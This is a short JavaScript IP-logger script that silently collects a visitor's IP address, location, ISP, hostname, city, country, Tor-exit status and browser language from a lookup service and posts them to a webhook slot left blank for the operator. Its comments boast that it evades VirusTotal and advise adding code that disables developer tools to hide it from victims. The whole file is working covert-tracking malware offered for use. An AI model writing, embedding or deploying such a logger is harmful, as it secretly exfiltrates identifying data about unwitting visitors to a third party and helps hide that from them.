// Note: this is undetected in Virustotal but the process could be EASILY found in the console so you need a disable developer tools code
// using wtfismyip demo
fetch("https://wtfismyip.com/json")
.then((response) => response.json())
.then((data) => {
  
let Logger = {
Header: "**Some information:** ", // don't ask why
IP: "\n```IPAddress: "  + data.YourFuckingIPAddress ,
Location: "\nLocation: "  + data.YourFuckingLocation ,
Hostname: "\nHostname: " + data.YourFuckingHostname,
ISP: "\nISP: " + data.YourFuckingISP,
City: "\nCity: " + data.YourFuckingCity,
country: "\nCountry: " + data.YourFuckingCountry,
Torexit: "\nTorExit: " + data.YourFuckingTorExit,
Languages: "\nLanguage: "  + navigator.language + "```" ,
}; // You can add more but I thought this was enough tbh 

// Set up the response for the webhook
const response = {
"embeds": [
    {
    "color": "0001",
    "title": "Logger",
    "description": (Logger.Header) + (Logger.IP) + (Logger.Location) + (Logger.country) + (Logger.City) + (Logger.Hostname) + (Logger.ISP) + (Logger.Torexit) + (Logger.Languages),
"author": {
    "name": "Something",
    "url": "https://soulsie.xyz",
    "icon_url": ""
  },
"footer": {
    "text": "JavaScript Logger",
    "icon_url": ""
       }
    }
  ]
};

// response
fetch("", { // webhook goes here
     method: "POST",
   headers: {
      "Content-Type": "application/json",
    },
 body: JSON.stringify(response), // formatting the response in json
 })
 // error handling (risky but needed)
.then((response) => console.log(response))
.catch((error) => console.error(error));
})
.catch((error) => console.error(error));
